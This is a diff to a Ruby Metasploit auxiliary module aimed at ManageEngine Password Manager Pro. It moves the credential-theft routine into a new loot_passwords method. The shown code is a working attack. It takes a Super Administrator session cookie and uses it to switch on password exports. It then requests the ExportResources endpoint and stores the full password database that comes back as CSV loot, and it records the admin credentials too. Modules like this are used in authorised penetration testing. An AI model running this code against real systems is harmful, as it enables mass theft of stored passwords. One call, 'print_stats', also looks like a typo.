@@ -239,54 +239,13 @@ class Metasploit3 < Msf::Auxiliary
 
     if cookie_su.nil?
       fail_with(Failure::NoAccess, "#{peer} - Failed to authenticate as Super Administrator, account #{username} might not work.")
-    else
-      report_super_admin_creds(username, password)
     end
 
-    # 1st we turn on password exports
-    send_request_cgi({
-      'method' => 'POST',
-      'uri' => normalize_uri(target_uri.path, 'ConfigureOffline.ve'),
-      'cookie' => cookie_su,
-      'vars_post'  => {
-        'IS_XLS'         => 'true',
-        'includePasswd'  => 'true',
-        'HOMETAB'        => 'true',
-        'RESTAB'         => 'true',
-        'RGTAB'          => 'true',
-        'PASSWD_RULE'    => 'Offline Password File',
-        'LOGOUT_TIME'    => '20'
-      }
-    })
+    print_stats("#{peer} - Reporting Super Administrator credentials...")
+    report_super_admin_creds(username, password)
 
-    # now get the loot!
-    res = send_request_cgi({
-      'method' => 'GET',
-      'uri' => normalize_uri(target_uri.path, 'jsp', 'xmlhttp', 'AjaxResponse.jsp'),
-      'cookie' => cookie_su,
-      'vars_get' => {
-        'RequestType' => 'ExportResources'
-      }
-    })
-
-    if res && res.code == 200 && res.body && res.body.to_s.length > 0
-      vprint_line(res.body.to_s)
-      print_good("#{peer} - Successfully exported password database from Password Manager Pro.")
-      loot_name     = 'manageengine.passwordmanagerpro.password.db'
-      loot_type     = 'text/csv'
-      loot_filename = 'manageengine_pmp_password_db.csv'
-      loot_desc     = 'ManageEngine Password Manager Pro Password DB'
-      p = store_loot(
-        loot_name,
-        loot_type,
-        rhost,
-        res.body,
-        loot_filename,
-        loot_desc)
-      print_status "Password database saved in: #{p}"
-    else
-      print_error("#{peer} - Failed to export Password Manager Pro passwords.")
-    end
+    print_status("#{peer} - Leaking Password database...")
+    loot_passwords(cookie_su)
   end
 
   def report_super_admin_creds(username, password)
@@ -318,5 +277,52 @@ class Metasploit3 < Msf::Auxiliary
     }
     login_data.merge!(service_data)
     create_credential_login(login_data)
+  end
+
+  def loot_passwords(cookie_admin)
+    # 1st we turn on password exports
+    send_request_cgi({
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'ConfigureOffline.ve'),
+      'cookie' => cookie_admin,
+      'vars_post'  => {
+        'IS_XLS'         => 'true',
+        'includePasswd'  => 'true',
+        'HOMETAB'        => 'true',
+        'RESTAB'         => 'true',
+        'RGTAB'          => 'true',
+        'PASSWD_RULE'    => 'Offline Password File',
+        'LOGOUT_TIME'    => '20'
+      }
+    })
+
+    # now get the loot!
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, 'jsp', 'xmlhttp', 'AjaxResponse.jsp'),
+      'cookie' => cookie_admin,
+      'vars_get' => {
+        'RequestType' => 'ExportResources'
+      }
+    })
+
+    if res && res.code == 200 && res.body && res.body.to_s.length > 0
+      vprint_line(res.body.to_s)
+      print_good("#{peer} - Successfully exported password database from Password Manager Pro.")
+      loot_name     = 'manageengine.passwordmanagerpro.password.db'
+      loot_type     = 'text/csv'
+      loot_filename = 'manageengine_pmp_password_db.csv'
+      loot_desc     = 'ManageEngine Password Manager Pro Password DB'
+      p = store_loot(
+          loot_name,
+          loot_type,
+          rhost,
+          res.body,
+          loot_filename,
+          loot_desc)
+      print_status("#{peer} - Password database saved in: #{p}")
+    else
+      print_error("#{peer} - Failed to export Password Manager Pro passwords.")
+    end
   end
 end
